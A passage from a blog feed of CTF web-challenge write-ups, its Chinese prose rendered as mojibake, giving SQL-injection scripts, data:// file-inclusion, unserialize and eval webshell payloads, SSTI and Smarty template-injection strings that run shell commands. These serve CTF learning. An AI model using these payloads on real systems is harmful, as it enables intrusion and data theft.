ä¸Šä¸¤ä¸²<code>(%ff%ff%ff%ff%ff%ff%ff)</code>â€”&gt;<code>(%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)</code>â€”â€“&gt;å°†å¯¹åº”ä½ç½®ä¸Šçš„å­—ç¬¦ä¿®æ”¹ï¼Œæ¯”å¦‚<code>i</code>åœ¨ç¬¬ä¸‰ä½ï¼Œå°±æŠŠå‰ä¸‰ä¸²çš„ç¬¬ä¸‰ä½æ”¹æˆ<code>c n d</code>å¯¹åº”çš„<code>%9c %91 %9b</code>â€”-&gt;<code>(%8f%8d%9c%91%8b%a0%8d)^(%ff%ff%91%ff%ff%ff%ff)^(%ff%ff%9b%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)</code>    </p><p>scandirä¹Ÿæ¢å     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/7f460d9d7f5b74e8.png">   </p><p>åŸæœ¬åäº”ä¸ªï¼ŒåŠ ä¸Š<code>%ff</code>ï¼Œåå…­ä¸ªï¼Œå‡ä¸‰ï¼Œåä¸‰ä¸ª</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>or^or</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>knowledge</tag>
      
      <tag>or^or</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2021/07/11/BUU89/"/>
    <url>/2021/07/11/BUU89/</url>
    
    <content type="html"><![CDATA[<hr><p>title:  [SWPU2019]Web4<br>date:  2021-07-11 22:58:38<br>tags:  [CTF,WP,sql]<br>categories:  [CTF,sql]<br>index_img:  /img/0016.png<br>banner_img:  /img/0015.jpg</p><hr><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>æ‰“å¼€æ˜¯ä¸€ä¸ªç™»å½•æ¡†<br><img src="https://ftp.bmp.ovh/imgs/2021/07/29b0021639f71a2e.png">      </p><p>burpæŠ“åŒ…åŠ ä¸ª<code>&#39;</code>å‘ç°æŠ¥é”™<br><img src="https://ftp.bmp.ovh/imgs/2021/07/f58c9b6d66785aff.png">     </p><p>sqlæ³¨å…¥äº†ï¼Œä¸è¿‡æŠ¥é”™æ˜¾ç¤ºçš„æ˜¯<code>fetch()</code>å‡½æ•°é”™è¯¯     </p><p><a href="https://xz.aliyun.com/t/3950"><code>PDOä¸‹çš„SQLæ³¨å…¥</code></a><br>PDOâ€”&gt;phpæ•°æ®å¯¹è±¡       </p><p>PDOæ”¯æŒå¤šè¯­å¥æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯å †å æ³¨å…¥      </p><p>PDOä¸­çš„query()å‡½æ•°åŒæ•°æ®åº“äº¤äº’</p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$dbms=<span class="hljs-string">&#x27;mysql&#x27;</span>;$host=<span class="hljs-string">&#x27;192.168.27.61&#x27;</span>;$dbName=<span class="hljs-string">&#x27;test&#x27;</span>;$user=<span class="hljs-string">&#x27;root&#x27;</span>;$pass=<span class="hljs-string">&#x27;root&#x27;</span>;$dsn=<span class="hljs-string">&quot;<span class="hljs-subst">$dbms</span>:host=<span class="hljs-subst">$host</span>;dbname=<span class="hljs-subst">$dbName</span>&quot;</span>;<span class="hljs-keyword">try</span> &#123;    $pdo = <span class="hljs-keyword">new</span> PDO($dsn, $user, $pass);&#125; <span class="hljs-keyword">catch</span> (PDOException $e) &#123;    <span class="hljs-keyword">echo</span> $e;&#125;$sql = <span class="hljs-string">&quot;select * from user where id=1;&quot;</span>;$sql .= <span class="hljs-string">&quot;create table test2 like user&quot;</span>;$stmt = $pdo-&gt;query($sql);<span class="hljs-keyword">while</span>($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))&#123;    var_dump($row);    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125;</code></pre></code></pre><p>prepareé¢„å¤„ç†      </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/fb83bbb774d5c639.png">      </p><p>ä»¥æ­¤ç»“åˆåå…­è¿›åˆ¶æ³¨å…¥    </p><p>æ‰¾äº†WPçš„è„šæœ¬ï¼Œä½†è·‘ä¸å‡ºæ¥-_-</p><pre><code><pre><code class="hljs python">    <span class="hljs-comment">#author: c1e4r</span>    <span class="hljs-keyword">import</span> requests    <span class="hljs-keyword">import</span> json    <span class="hljs-keyword">import</span> time    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>        <span class="hljs-comment">#é¢˜ç›®åœ°å€</span>        url = <span class="hljs-string">&#x27;&#x27;&#x27;http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;</span>        <span class="hljs-comment">#æ³¨å…¥payload</span>        payloads = <span class="hljs-string">&quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span>        flag = <span class="hljs-string">&#x27;&#x27;</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):            <span class="hljs-comment">#æŸ¥è¯¢payload</span>            payload = <span class="hljs-string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">128</span>):                <span class="hljs-comment">#å°†æ„é€ å¥½çš„payloadè¿›è¡Œ16è¿›åˆ¶è½¬ç å’Œjsonè½¬ç </span>                datas = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payloads.<span class="hljs-built_in">format</span>(str_to_hex(payload.<span class="hljs-built_in">format</span>(i,j))),<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;test213&#x27;</span>&#125;                data = json.dumps(datas)                times = time.time()                res = requests.post(url = url, data = data)                <span class="hljs-keyword">if</span> time.time() - times &gt;= <span class="hljs-number">3</span>:                    flag = flag + <span class="hljs-built_in">chr</span>(j)                    print(flag)                    <span class="hljs-keyword">break</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_hex</span>(<span class="hljs-params">s</span>):</span>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s])    <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:        main()    ```  å¾—åˆ°`glzjin_wants_a_girl_friend.<span class="hljs-built_in">zip</span>`æºç      ![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">07</span>/b7c5c05c1929a09f.png)     `å‰ç«¯åº”ç”¨é€»è¾‘çš„åŸºç¡€åœ¨ controller æ–‡ä»¶å¤¹ä¸‹é¢ï¼Œè€Œå…¶ä»–æ–‡ä»¶éƒ½æ˜¯åŸºäº basecontroller.php æ‰€ä»¥æˆ‘ä»¬æ‰“å¼€ basecontroller.php æ–‡ä»¶è¿›è¡Œä»£ç å®¡è®¡`          ```php    private $viewPath;        public function loadView($viewName =<span class="hljs-string">&#x27;&#x27;</span>, $viewData = [])        &#123;            $this-&gt;viewPath = BASE_PATH . &quot;/View/&#123;$viewName&#125;.php&quot;;            if(file_exists($this-&gt;viewPath))            &#123;                extract($viewData);                include $this-&gt;viewPath;            &#125;        &#125;</code></pre></code></pre><p><code>extract</code>å¯ä»¥è¿›è¡Œå˜é‡è¦†ç›–     </p><p>æ‰¾åˆ°<code>UserController.php</code>ä¸­è°ƒç”¨äº†<code>loadView</code>ä¸”ç¬¬äºŒä¸ªå‚æ•°å¯æ§      </p><pre><code><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">actionList</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $params = $_REQUEST;        $userModel = <span class="hljs-keyword">new</span> UserModel();        $listData = $userModel-&gt;getPageList($params);        <span class="hljs-keyword">$this</span>-&gt;loadView(<span class="hljs-string">&#x27;userList&#x27;</span>, $listData );    &#125;</code></pre></code></pre><p>åœ¨<code>userindex.php</code>ä¸­</p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($img_file)) &#123;    $img_file = <span class="hljs-string">&#x27;/../favicon.ico&#x27;</span>;&#125;$img_dir = dirname(<span class="hljs-keyword">__FILE__</span>) . $img_file;$img_base64 = imgToBase64($img_dir);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;&#x27;</span> . $img_base64 . <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>;</code></pre></code></pre><p>æ‰€ä»¥ä¼ å…¥<code>img_file=/../flag.php</code>   </p><p>éœ€è¦å…ˆè¿›å…¥<code>userIndex.php</code>ï¼Œurlä¸­ä¿®æ”¹<code>r=UserIndex</code>     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/f579ea716508e496.png">   </p><p>æºç ä¸­å›¾ç‰‡base64è§£ç å¾—åˆ°flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CJBCTF</title>
    <link href="/2021/07/11/CJBCTF/"/>
    <url>/2021/07/11/CJBCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><ul><li>æ–‡ä»¶åŒ…å«</li></ul><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/*</span><span class="hljs-comment"># -*- coding: utf-8 -*-</span><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-06-29 03:16:43</span><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-06-30 04:43:37</span><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><span class="hljs-comment"></span><span class="hljs-comment">*/</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;    $ext = pathinfo($_GET[<span class="hljs-string">&#x27;file&#x27;</span>], PATHINFO_EXTENSION);    <span class="hljs-keyword">if</span>($ext===<span class="hljs-string">&#x27;php&#x27;</span>)&#123;        <span class="hljs-keyword">include</span> $_GET[<span class="hljs-string">&#x27;file&#x27;</span>];    &#125;&#125;</code></pre></code></pre><p><code>pathinfo</code>è¦æ±‚ä¼ å…¥çš„<code>file</code>åç¼€åä¸º<code>php</code>ï¼Œå°±ä¼š<code>include</code>      </p><p>çœ‹åˆ°includeè¦æƒ³åˆ°ä¼ªåè®®äº†    </p><p>è¿™é‡Œç”¨<code>data://text/plain</code>     </p><p>payload:<code>?file=data://text/plain,&lt;?php var_dump(scandir(&#39;/&#39;));?&gt;.php</code></p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/6a15b87627e024ff.png">    </p><p><code>?file=data://text/plain,&lt;?php echo file_get_contents(&#39;/secret&#39;);?&gt;.php</code><br>å¾—åˆ°flag     </p><h2 id="cjbweb"><a href="#cjbweb" class="headerlink" title="cjbweb"></a>cjbweb</h2><ul><li>ä»£ç å®¡è®¡</li></ul><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$safe=<span class="hljs-string">&quot;Hack me!&quot;</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;    <span class="hljs-keyword">public</span> $name=<span class="hljs-string">&quot;var_dump&quot;</span>;    <span class="hljs-keyword">public</span> $msg=<span class="hljs-string">&quot;Happy to cjb&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">global</span> $safe;        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/\d|\/|,|\([^()]*\([^()]*\)/&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;msg))&#123;            <span class="hljs-keyword">$this</span>-&gt;name=<span class="hljs-string">&quot;var_dump&quot;</span>;            <span class="hljs-keyword">$this</span>-&gt;msg=<span class="hljs-string">&quot;You look dangerous!!!&quot;</span>;            $safe=<span class="hljs-string">&quot;I think waf is enough.&quot;</span>;        &#125;        call_user_func(<span class="hljs-keyword">$this</span>-&gt;name,<span class="hljs-keyword">$this</span>-&gt;msg);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">global</span> $safe;        var_dump($safe);    &#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;info&#x27;</span>]))&#123;    $info=$_POST[<span class="hljs-string">&#x27;info&#x27;</span>];    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/s:4:&quot;name&quot;;s:\d:&quot;v\w*&quot;/&#x27;</span>,$info))&#123;        unserialize($info);    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I just love v&quot;</span>;    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    $hacker=<span class="hljs-keyword">new</span> Hacker();    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;</code></pre></code></pre><ul><li><p>ç¬¬ä¸€ç§æ€è·¯ï¼šåœ¨ç±»ä¸­å†™ä¸¤æ¬¡ç›¸åŒçš„å±æ€§åï¼Œåé¢çš„å±æ€§å€¼ä¼šè¦†ç›–å‰é¢çš„å±æ€§å€¼ï¼ˆç±»çš„å±æ€§ä¸ªæ•°è¦åŠ 1ï¼‰<br>  <code>\([^()]*\([^()]*\)</code>è¿™æ¡æ­£åˆ™è¿‡æ»¤çš„æ—¶æ‹¬å·åµŒå¥—<code>(())</code>   </p><p>  payload:<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:22:&quot;eval($_POST[&#39;shell&#39;]);&quot;;&#125;&amp;&amp;shell=var_dump(scandir(&#39;/&#39;));</code><br>  <img src="https://ftp.bmp.ovh/imgs/2021/07/f084c58e911870b0.png">    </p><p>  <code>shell=echo file_get_contents(&#39;/you_never_know_my_name&#39;)</code>   </p></li></ul><ul><li><p>ç¬¬äºŒç§æ€è·¯ï¼šåˆ©ç”¨<code>$safe</code><br>  æ ¹ç›®å½•payload:<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:57:&quot;$safe=chdir(&#39;..&#39;).chdir(&#39;..&#39;).chdir(&#39;..&#39;)?scandir(&#39;.&#39;):&#39;&#39;&quot;;&#125;</code><br>  <code>chdir(&#39;..&#39;).chdir(&#39;..&#39;).chdir(&#39;..&#39;)?scandir(&#39;.&#39;):&#39;&#39;</code>è¿™æ ·ç©¿è¶Šç›®å½•tql   </p><p>  è¯»flagpayloadï¼š<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:85:&quot;$safe=chdir(&#39;..&#39;).chdir(&#39;..&#39;).chdir(&#39;..&#39;).file_get_contents(&#39;you_never_know_my_name&#39;)&quot;;&#125;</code>      </p></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>CJBCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Newctf</title>
    <link href="/2021/06/02/newctf/"/>
    <url>/2021/06/02/newctf/</url>
    
    <content type="html"><![CDATA[<h2 id="2021-6-1èŒæ–°èµ›-easy-web"><a href="#2021-6-1èŒæ–°èµ›-easy-web" class="headerlink" title="2021.6.1èŒæ–°èµ›-easy_web"></a>2021.6.1èŒæ–°èµ›-easy_web</h2><p>hint:è¿™ä¸ªå›¾ç‰‡çœŸå¥½çœ‹å‘€ï¼Œæ²¡å•¥éšè—çš„ä¸œè¥¿å§    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/06/a108d4199c1e415b.png">       </p><p>ç¬¬ä¸€ç‚¹ï¼š<code>md5($six_number) == &#39;e10adc3949ba59abbe56e057f20f883e&#39;</code><br>è¿™ä¸€ä¸²æ˜¯123456çš„MD5       </p><p>ç¬¬äºŒç‚¹ï¼š<code>===</code>å¯ä»¥æ•°ç»„ç»•è¿‡        </p><p>ç¬¬ä¸‰ç‚¹ï¼š<code>$array[++$c]=1</code>æ•°ç»„ç´¢å¼•æº¢å‡ºï¼Œ<code>$c=9223372036854775806</code>      </p><p>payload:<code>webp=123456&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806</code>     </p><p>è¿”å›ï¼š   </p><pre><code>ä½ è§‰å¾—å°±è¿™ä¹ˆç®€å•å—ï¼Ÿï¼Ÿï¼Ÿï¼Œå¯ä»¥å‘Šè¯‰ä½ å¯†ç å“¦ï¼        password: xluoyyds123456@@@      </code></pre><p>ç„¶åæ˜¯ä¸€ä¸ªå›¾ç‰‡éšå†™ï¼Œä¸‹è½½ä¸‹æ¥èƒŒæ™¯å›¾ç‰‡ï¼Œåç¼€æ”¹ä¸º<code>.rar</code>       </p><p><img src="https://ftp.bmp.ovh/imgs/2021/06/8c299e4b1ca8b594.png">         </p><p>è¾“å…¥å¯†ç å¾—åˆ°flag    </p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NEEPUCTF</title>
    <link href="/2021/05/27/NEEPUCTF/"/>
    <url>/2021/05/27/NEEPUCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="remote-table"><a href="#remote-table" class="headerlink" title="remote_table"></a>remote_table</h2><p>æ‰“å¼€ç¯å¢ƒ    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/b36aac21b99441e6.png"></p><p>å°±åœ¨è¿™é‡Œï¼Œæˆ‘å±…ç„¶æ²¡æ‰¾åˆ°ï¼Œå¤ªå¤±è´¥äº†   </p><h2 id="The-myth-of-Aladdin"><a href="#The-myth-of-Aladdin" class="headerlink" title="The_myth_of_Aladdin"></a>The_myth_of_Aladdin</h2><p>SSTI<br>è¿‡æ»¤äº†<code>&#123;&#123;&#125;&#125;</code>ç”¨<code>&#123;%print()%&#125;</code>æ›¿ä»£<br><code>.</code>ç”¨<code>[]</code>æ›¿æ¢<br>è¿‡æ»¤äº†ç±»åï¼Œå…«è¿›åˆ¶æˆ–è€…Unicodeå‡å¯ç»•è¿‡     </p><p>payloadï¼š<code>&#123;%print(().__class__.__base__.__subclass__()[95].__init__.__globals__.__builtins__.__import__('os').popen('ls').read())%&#125;</code>   </p><p>è½¬å…«è¿›åˆ¶     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$str=<span class="hljs-string">&#x27;read&#x27;</span>;$res=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($str);$i++)&#123;    $res.=<span class="hljs-string">&quot;\\&quot;</span>.decoct(ord($str[$i]));&#125;<span class="hljs-keyword">echo</span> $str.<span class="hljs-string">&quot;\n&quot;</span>;var_dump($res);</code></pre></code></pre><p>en-payload:<code>&#123;%print(()["\137\137\143\154\141\163\163\137\137"]["\137\137\142\141\163\145\137\137"]["\137\137\163\165\142\143\154\141\163\163\145\163\137\137"]()[95]["\137\137\151\156\151\164\137\137"]["\137\137\147\154\157\142\141\154\163\137\137"]["\137\137\142\165\151\154\164\151\156\163\137\137"]["\137\137\151\155\160\157\162\164\137\137"]("o""s")["\160\157\160\145\156"]("ls")["\162\145\141\144"]())%&#125;</code>     </p><p>ç©ºæ ¼ç”¨<code>%09</code>ä»£æ›¿     </p><p>æœ€åè¯»å–flagè¿‡æ»¤äº†<code>Neepu</code>ï¼ŒUnicodeç¼–ç <br><code>cat /flag|base64</code>â€”&gt;<code>\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u007c\u0062\u0061\u0073\u0065\u0036\u0034</code>     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/36675dab86b84736.png">    </p><p>WPæ˜¯ä½¿ç”¨æˆªæ–­çš„æ–¹æ³•è¯»å–flagçš„<br><code>&quot;c&quot;&quot;ut%09-c%092-40%09/fl&quot;&quot;ag&quot;</code><br>cut<br> <code>-c</code>:ä»…æ˜¾ç¤ºè¡Œä¸­æŒ‡å®šèŒƒå›´çš„å­—ç¬¦ï¼›     </p><h2 id="gamebox"><a href="#gamebox" class="headerlink" title="gamebox"></a>gamebox</h2><p>æ‰“å¼€ç¯å¢ƒæ˜¯ä¸ªç™»å½•æ¡†ï¼Œä¸‡èƒ½å¯†ç å³å¯ç™»å½•<code>adwa&#39;=&#39;0</code><br>è¿›å…¥åæ˜¯ä¸ªå°æ¸¸æˆ<br><img src="https://ftp.bmp.ovh/imgs/2021/05/00e8b9a1dd156058.png">     </p><p>éªŒè¯ç å›¾ç‰‡çš„åå­—å°±æ˜¯éªŒè¯ç ï¼Œå¯ä»¥å†™è„šæœ¬è·‘    </p><p>çŒœå¯¹äº”æ¬¡åä¼šè¿›è¡Œè·³è½¬<br><code>http://neepusec.club:18943/index.php?file=rander.php</code>       </p><p>å¯ä»¥ç”¨ä¸ºåè®®è¯»å–ä¸‹æºç <br><code>?file=php://filter/read=convert.base64-encode/resource=rander.php</code>     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// create object</span><span class="hljs-keyword">if</span> ($_SESSION[<span class="hljs-string">&#x27;num&#x27;</span>] &gt;= <span class="hljs-number">5</span>) &#123;    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;smarty/Smarty.class.php&#x27;</span>);    $smarty = <span class="hljs-keyword">new</span> Smarty;    $name = $_SESSION[<span class="hljs-string">&quot;username&quot;</span>];    $smarty-&gt;display(<span class="hljs-string">&#x27;string:æ­å–œ &#x27;</span>.$name.<span class="hljs-string">&#x27; è·å¾—äº†èƒœåˆ©&#x27;</span>);&#125;</code></pre></code></pre><p><code>display</code>å­˜åœ¨PHPæ¨¡æ¿æ³¨å…¥     </p><p>åå­—æ”¹æˆæ¨¡æ¿æ³¨å…¥è¯­å¥å³å¯<br>è¿™é‡Œè¿˜æœ‰<code>disable_function</code>,å¯ä»¥ç”¨<code>shell_exec</code>    </p><p>WPçš„EXPï¼š        </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> requestsurl=<span class="hljs-string">&quot;http://neepusec.club:18943&quot;</span>s = requests.Session()<span class="hljs-comment">#payload = &quot;&#123;&#123;shell_exec(\&quot;\ls\t/\&quot;)&#125;&#125;&#x27;=&#x27;0&quot;</span>payload = <span class="hljs-string">&quot;&#123;&#123;shell_exec(\&quot;cat\t/This_is_your_Flag\&quot;)&#125;&#125;&#x27;=&#x27;0&quot;</span>login_data = &#123;<span class="hljs-string">&quot;username&quot;</span>:payload&#125;res0 = s.post(url+<span class="hljs-string">&quot;/login.php&quot;</span>,data = login_data)res1 = s.get(url+<span class="hljs-string">&quot;/index.php&quot;</span>)reg = re.findall(<span class="hljs-string">&#x27;pic\/.*?\.jpg&#x27;</span>,res1.text)data=&#123;<span class="hljs-string">&quot;authcode&quot;</span>:reg[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&quot;guess&quot;</span>:<span class="hljs-string">&quot;on&quot;</span>&#125;<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1000</span>):    res3 = s.post(url+<span class="hljs-string">&quot;/index.php&quot;</span>,data=data)    reg = re.findall(<span class="hljs-string">&#x27;pic\/.*?\.jpg&#x27;</span>,res3.text)    data=&#123;<span class="hljs-string">&quot;authcode&quot;</span>:reg[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&quot;guess&quot;</span>:<span class="hljs-string">&quot;on&quot;</span>&#125;    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(res3.text)!=<span class="hljs-number">3287</span>):        print(i)        print(res3.text)        <span class="hljs-keyword">break</span></code></pre></code></pre><p>å¦ä¸€ç§æ–¹æ³•<a href="https://www.cnblogs.com/erR0Ratao/p/14806464.html">ï¼ˆæ—¥å¿—åŒ…å«ï¼‰</a>ï¼š<br>æ—¥å¿—è·¯å¾„<code>file=/var/log/nginx/access.log</code><br><img src="https://ftp.bmp.ovh/imgs/2021/05/4ad56cf981691d27.png">       </p><p>å†™å…¥ä¸€å¥è¯<br><img src="https://ftp.bmp.ovh/imgs/2021/05/81e22ec2143d5c2f.png"></p><p><a href="https://www.cnblogs.com/erR0Ratao/p/14806464.html">more</a>     </p><p><a href="https://www.cnblogs.com/my1e3/p/5854897.html">æ—¥å¿—åŒ…å«</a>     </p><hr><p><a href="https://www.anquanke.com/post/id/242237#h3-2">æœ€åä¸¤é¢˜</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MTCTF CSICN</title>
    <link href="/2021/05/25/MTCISCN/"/>
    <url>/2021/05/25/MTCISCN/</url>
    
    <content type="html"><![CDATA[<h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>MTçš„ç¬¬ä¸€é¢˜ï¼Œæ—¶é—´ç›²æ³¨ï¼Œä½†æ˜¯å¸¸è§çš„å­—ç¬¦éƒ½è¿‡äº†<code>ascii</code>ã€<code>substr</code>,å¤§äºå·å°äºå·ç­‰äºå·ï¼Œ<code>lile</code>,<code>if</code>éƒ½è¿‡äº†ï¼Œä¸ä¼šäº†   </p><p><code>W&amp;M</code> çš„WP   </p><pre><code><pre><code class="hljs python">    <span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> req    <span class="hljs-keyword">import</span> time    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ord2hex</span>(<span class="hljs-params">string</span>):</span>    result = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string:        result += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))    result = result.replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0x&#x27;</span>+result    url = <span class="hljs-string">&quot;http://eci-2ze7bgvjvxtgmki6mtcj.cloudeci1.ichunqiu.com/index.php&quot;</span>    string = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>]    headers = &#123;        <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0&#x27;</span>,        <span class="hljs-string">&#x27;Accept&#x27;</span>:<span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,        <span class="hljs-string">&#x27;Connection&#x27;</span>:<span class="hljs-string">&#x27;keep-alive&#x27;</span>        &#125;    res = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> string:        passwd = ord2hex(<span class="hljs-string">&#x27;^&#x27;</span>+res+<span class="hljs-built_in">chr</span>(j))        <span class="hljs-comment">#print(passwd)</span>        passwd = <span class="hljs-string">&#x27;||case/**/when/**/password/**/regexp/**/binary/**/&#123;&#125;/**/then/**/sleep(3)/**/else/**/1111111/**/end/**/#&#x27;</span>.<span class="hljs-built_in">format</span>(passwd)        <span 